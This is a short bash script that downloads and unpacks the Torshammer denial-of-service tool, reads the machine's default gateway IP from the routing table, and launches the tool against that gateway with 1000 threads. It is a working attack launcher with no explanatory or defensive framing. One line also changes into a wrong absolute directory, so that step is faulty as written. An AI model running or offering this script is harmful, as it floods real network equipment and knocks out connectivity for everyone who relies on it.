#!/bin/bash


cd /etc

sudo mkdir Torshammer

cd /Torshammer

sudo wget https://sourceforge.net/projects/torshammer/files/latest/download

ls

sudo unzip download

cd Torshammer\ 1.0/

ls

ip=`route | grep 'default' | awk '{print $2}'`
echo "$ip"

python2.7 torshammer.py -t $ip -r 1000
